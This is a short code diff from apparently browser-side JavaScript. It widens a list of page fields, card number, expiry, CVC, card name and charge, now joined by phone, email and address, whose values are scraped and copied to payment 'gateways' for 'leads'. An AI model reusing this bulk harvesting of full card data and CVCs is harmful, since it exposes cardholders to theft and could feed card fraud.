@@ -1010,8 +1010,11 @@ async function processLeadWithLLC(type, id, status, btn) {
                 if (labelSpan && valueSpan) {
                     const labelText = labelSpan.innerText.trim();
                     
-                    // The specific fields you need to copy to gateways
-                    const targetFields = ['Card Number:', 'Expiry Date:', 'Charge:', 'CVC:', 'Card Name:'];
+                    // Added Phone, Email, and Address to the target fields
+                    const targetFields = [
+                        'Card Number:', 'Expiry Date:', 'Charge:', 'CVC:', 
+                        'Card Name:', 'Phone:', 'Email:', 'Address:'
+                    ];
                     
                     if (targetFields.includes(labelText)) {
                         
